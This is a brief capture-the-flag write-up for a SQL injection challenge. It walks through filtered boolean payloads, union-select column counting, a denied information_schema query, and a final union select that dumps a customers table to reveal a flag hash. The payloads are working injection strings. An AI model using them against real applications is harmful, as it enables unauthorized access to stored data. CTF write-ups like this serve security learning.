# SQL Injection 2

We try the obvious `' or 1=1-- ` but it looks like `or` is getting filtered out.

Let's try `' union select null-- ` to see how many columns are being returned.

Ok this works `' union select null,null,null,null-- ` so there are four columns.

Let's get the tables with:

`' union select null,table_name,null,null from information_schema.tables-- `

> com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: SELECT command denied to user 'RightGuard3d'@'localhost' for table 'tables'

Hmmm... maybe we can just union everything from the `customers` table.

`' union select * from customers-- `

Success!

> fd8e9a29dab791197115b58061b215594211e72c1680f1eacc50b0394133a09f
